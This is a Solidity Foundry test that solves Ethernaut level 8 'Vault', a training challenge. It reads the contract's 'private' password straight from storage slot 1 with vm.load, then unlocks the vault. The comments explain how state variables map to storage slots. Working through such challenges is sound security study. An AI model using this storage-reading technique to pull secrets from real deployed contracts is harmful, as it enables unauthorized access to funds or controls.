// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Test.sol";
import "../../src/ethernaut/level_8/Vault.sol";

contract VaultTest is Test {
    using stdStorage for StdStorage;

    Vault public vault;
    bytes32 password; // password passed into vault constructor

    function setUp() public {
        password = keccak256("StdCheats");
        vault = new Vault(password);
    }

    function testAttack() public {
        // storage slot count starts at 0 and is followed in the order that
        //  state variables are declared in the contract

        //  bool public locked; slot 0
        //  bytes32 private password;  slot 1

        // load data from storage position 1, count starts at 0.
        bytes32 _password = vm.load(address(vault), bytes32(uint256(1)));

        assertEq(_password, password);

        vault.unlock(_password); // locked == false now;
        assert(!vault.locked());
    }
}
